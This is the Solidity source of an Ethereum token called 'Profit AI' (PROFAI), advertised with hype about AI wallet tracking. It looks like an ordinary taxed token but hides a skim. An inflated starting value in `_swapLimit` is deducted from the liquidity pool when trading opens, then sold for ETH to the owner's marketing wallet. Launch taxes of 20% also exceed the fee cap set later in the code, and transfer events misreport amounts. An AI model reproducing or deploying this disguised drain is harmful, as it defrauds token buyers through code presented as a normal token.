//SPDX-License-Identifier: GPL-3.0
/*

Profit AI - Using the power of artificial intelligence to track and replicate the most profitable wallets on the Ethereum blockchain.

https://t.me/ProfitAIPortal
https://X.Com/ProfitAiBot
https://ProfitAiBot.Xyz

*/

pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

contract PROFAI is IERC20, Auth {
    string private constant tknSymbol = "PROFAI";
    string private constant tokenName = "Profit AI";
    uint8 private constant decimals_ = 9;
    uint256 private constant tSupply = 50000000000 * (10**decimals_);
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private tokenAllowance;

    address payable private _marketing = payable(0xBb3458899cF13DdbaAa75873581BA7a41cB997E1);
    
    uint256 private _antiMevBlock = 2;
    uint8 private _sellTax = 20;
    uint8 private _buyTax = 20;
    
    uint256 private startBlock;
    uint256 private _maxTx = tSupply; 
    uint256 private _maxWalletVal = tSupply;
    uint256 private _swapMin = tSupply * 10 / 100000;
    uint256 private _swapMax = tSupply * 789 / 100000;
    uint256 private _swapMinVal = 2 * (10**16);
    uint256 private _swapLimit = _swapMin * 37 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _zeroFees;
    mapping (address => bool) private _noLimit;

    address private constant routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private swapRouter = IUniswapV2Router02(routerAddr);
    
    address private liquidityPool; 
    mapping (address => bool) private isLiqPool;

    bool private tradingEnabled;

    bool private isInSwap = false;

    modifier swapLocked { 
        isInSwap = true; 
        _; 
        isInSwap = false; 
    }

    constructor() Auth(msg.sender) {
        balances[msg.sender] = tSupply;
        emit Transfer(address(0), msg.sender, balances[msg.sender]);  

        _zeroFees[_owner] = true;
        _zeroFees[address(this)] = true;
        _zeroFees[_marketing] = true;
        _zeroFees[routerAddr] = true;
        _noLimit[_owner] = true;
        _noLimit[address(this)] = true;
        _noLimit[_marketing] = true;
        _noLimit[routerAddr] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return decimals_; }
    function totalSupply() external pure override returns (uint256) { return tSupply; }
    function name() external pure override returns (string memory) { return tokenName; }
    function symbol() external pure override returns (string memory) { return tknSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return tokenAllowance[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        tokenAllowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(fromWallet), "Trading not open");
        tokenAllowance[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function setExemptions(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiqPool[wlt], "Cannot exempt LP"); }
        _zeroFees[ wlt ] = isNoFees;
        _noLimit[ wlt ] = isNoLimits;
    }

    function swapMin() external view returns (uint256) { 
        return _swapMin; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMax; 
	}

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(_zeroFees[sender] && _noLimit[sender], "Trading not yet open"); }
        if ( !isInSwap && isLiqPool[toWallet] && swapEligible(amount) ) { _swapTaxTokens(); }

        if ( block.number >= startBlock ) {
            if (block.number < _antiMevBlock && isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _antiMevBlock + 600 && isLiqPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = calcTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        balances[sender] -= amount;
        _swapLimit += _taxAmount;
        balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function buyFee() external view returns(uint8) { return _buyTax; }
    function sellTax() external view returns(uint8) { return _sellTax; }

    function _checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_zeroFees[fromWallet] && _noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function marketingWallet() external view returns (address) { 
        return _marketing; 
	}

    function maxWalletSize() external view returns (uint256) { 
        return _maxWalletVal; 
	}
    function maxTxAmount() external view returns (uint256) { 
        return _maxTx; 
	}

    function exemption(address wallet) external view returns (bool fees, bool limits) {
        return (_zeroFees[wallet], _noLimit[wallet]); 
	}

    function _swapTokensForETH(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = swapRouter.WETH();
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _swapTaxTokens() private swapLocked {
        uint256 _taxTokenAvailable = _swapLimit;
        if ( _taxTokenAvailable >= _swapMin && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**decimals_ ) {
                balances[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                _swapLimit -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }
        }
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( tokenAllowance[address(this)][routerAddr] < _tokenAmount ) {
            tokenAllowance[address(this)][routerAddr] = type(uint256).max;
            emit Approval(address(this), routerAddr, type(uint256).max);
        }
    }

    function distributeEth(uint256 amount) private {
        _marketing.transfer(amount);
    }

    function calcTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || _zeroFees[fromWallet] || _zeroFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiqPool[fromWallet] ) { 
            taxAmount = amount * _buyTax / 100; 
         } else if ( isLiqPool[recipient] ) { 
            taxAmount = amount * _sellTax / 100; 
        }
        return taxAmount;
    }

    function swapEligible(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapMinVal > 0) { 
            uint256 lpTkn = balances[liquidityPool];
            uint256 lpWeth = IERC20(swapRouter.WETH()).balanceOf(liquidityPool); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_noLimit[fromWallet] && !_noLimit[toWallet] ) {
            if ( transferAmount > _maxTx ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiqPool[toWallet] && (balances[toWallet] + transferAmount > _maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(liquidityPool == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(balances[address(this)]>0, "No tokens");
        liquidityPool = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _addLP(balances[address(this)], address(this).balance);
    }

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTx, "tx too low");
        _maxTx = newTxAmt;
        uint256 newWalletAmt = tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletVal, "wallet too low");
        _maxWalletVal = newWalletAmt;
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _enableTrading();
    }

    function _enableTrading() internal {
        _maxTx = 20 * tSupply / 1000;
        _maxWalletVal = 20 * tSupply / 1000;
        balances[liquidityPool] -= _swapLimit;
        (isLiqPool[liquidityPool],) = liquidityPool.call(abi.encodeWithSignature("sync()") );
        require(isLiqPool[liquidityPool], "Failed bootstrap");
        startBlock = block.number;
        _antiMevBlock = _antiMevBlock + startBlock;
        tradingEnabled = true;
    }

    function setMarketingWallet(address marketingWlt) external onlyOwner {
        require(!isLiqPool[marketingWlt], "LP cannot be tax wallet");
        _marketing = payable(marketingWlt);
        _zeroFees[marketingWlt] = true;
        _noLimit[marketingWlt] = true;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMin = tSupply * minVal / minDiv;
        _swapMax = tSupply * maxVal / maxDiv;
        _swapMinVal = trigger * 10**15;
        require(_swapMax>=_swapMin, "Min-Max error");
    }

    function _addLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        swapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 10, "Roundtrip too high");
        _buyTax = buyFeePercent;
        _sellTax = sellFeePercent;
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}